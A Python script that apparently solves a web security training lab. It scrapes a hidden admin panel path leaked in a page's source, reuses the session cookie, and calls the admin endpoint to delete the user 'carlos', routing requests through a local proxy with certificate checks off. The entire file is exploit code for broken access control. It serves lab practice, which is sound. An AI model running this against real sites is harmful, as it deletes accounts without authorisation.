# Unprotected admin functionality with unpredictable URL
# Write your code here
# Unprotected admin functionality with unpredictable URL
# Target Goal - Find the admin panel and delete user carlos

import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def delete_user(url):
    r = requests.get(url, verify=False, proxies=proxies)

    # Retrieve session cookie
    session_cookie = r.cookies.getdict().get('session')

    # Retrieve the admin path
    soup = BeautifulSoup(r.text, 'lxml')
    admin_instances = soup.find(text=re.compile('/admin-'))
    admin_path = re.search("href', '(.*)", admin_instances).group(1)
    # print(admin_instances)

    # Delete Carlos user
    cookies = {'session': session_cookie}
    delete_carlos_url = url + admin_path + "/delete?username=carlos"
    r = requests.get(delete_carlos_url, cookies=cookies, verify=False, proxies=proxies)
    if r.status_code == 200:
        print('(+) Carlos user delete!')
    else:
        print('(-) Deletion failed.')
        print('(-) Exiting script')
        sys.exit(-1)

def main():
    if (len(sys.argv) != 2):
        print("(+) Usage: %s <url", sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])

    url = sys.argv[1]
    print("(+) Deleting Carlos user...")
    delete_user(url)

#----------------------
if __name__ == "__main__":
    main()